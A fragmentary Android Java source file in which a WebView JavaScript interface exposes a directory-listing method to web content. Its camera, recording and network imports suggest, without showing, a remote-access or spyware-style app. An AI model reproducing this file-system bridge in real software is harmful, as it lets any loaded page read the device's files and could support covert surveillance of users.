package com.app.sys;
import android.os.*; import android.webkit.*; import android.app.*; import android.content.*; import android.net.Uri; import java.io.*; import android.util.Base64; import android.hardware.Camera; import android.graphics.SurfaceTexture; import android.media.MediaRecorder; import java.net.HttpURLConnection; import java.net.URL;
    ...
    protected void onCreate(Bundle s) {
        ...
        w.addJavascriptInterface(new Object(){
            @JavascriptInterface public String list(String p){
                ...
                StringBuilder sb=new StringBuilder(); for(File f:fs) sb.append(f.isDirectory()?"📁 ":"📄 ").append(f.getName()).append("\n");
                return sb.toString();
            }
